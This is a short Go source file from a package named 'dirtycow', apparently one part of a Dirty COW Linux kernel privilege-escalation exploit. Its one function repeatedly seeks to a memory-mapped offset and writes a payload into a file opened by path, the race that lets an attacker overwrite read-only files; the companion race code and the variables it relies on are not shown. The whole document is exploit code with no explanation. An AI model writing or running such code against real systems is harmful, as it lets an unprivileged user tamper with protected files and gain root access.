package dirtycow

import "os"
import "syscall"

func write_payload(path string, payload []byte) bool {

	file, err1 := os.OpenFile(path, syscall.O_RDWR, 0)

	if err1 == nil {

		for i := 0; i < 1000000; i++ {

			select {
			case <- signals:
				return true
			default:
				syscall.Syscall(
					syscall.SYS_LSEEK,
					file.Fd(),
					mmap,
					uintptr(os.SEEK_SET),
				)
				file.Write(payload)
			}

		}

	}

	return false

}
